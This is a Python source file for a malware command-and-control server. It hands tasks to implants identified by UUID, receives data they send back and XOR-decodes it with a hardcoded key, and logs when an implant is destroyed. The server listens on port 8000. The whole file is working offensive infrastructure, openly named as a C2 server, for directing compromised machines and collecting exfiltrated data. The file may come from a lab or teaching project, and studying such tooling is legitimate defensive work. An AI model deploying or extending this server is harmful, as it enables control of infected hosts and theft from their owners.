
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import os
import sys

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from obfuscation import deobfuscate_payload

# Store tasks per UUID
TASK_FILE = "tasks.json"
xor_key = "secret_key"


def load_tasks():
    if os.path.exists(TASK_FILE):
        with open(TASK_FILE, "r") as f:
            return json.load(f)
    return {}

class C2Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        print(f"post request received at {self.path} from {self.client_address[0]}")
        content_len = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_len).decode()
        try:
            data = json.loads(body)
        except json.JSONDecodeError:
            self.send_error(400, "Bad JSON")
            return
        
        tasks = load_tasks()

        if self.path == "/get_task":
            print("Get Task")
            uuid = data.get("uuid")
            task = tasks.get(uuid, {"task": "none"})
            response = json.dumps(task)
        elif self.path == "/submit_data":
            has_data = len(data.get("logs")) > 0
            if has_data:
                decoded = deobfuscate_payload(data, xor_key)
                print(f"[Received from implant]: {decoded}")
                response = json.dumps({"status": "ok"})
            else:
                self.send_error(400, "Missing 'data'")
                return
        elif self.path == "/destroy":
            print("Implant Successfully Destroyed")
            response = json.dumps({"status": "ok"})
        else:
            self.send_error(404, "Endpoint not found")
            return

        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(response.encode())

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8000), C2Handler)
    print("C2 server listening on port 8000")
    server.serve_forever()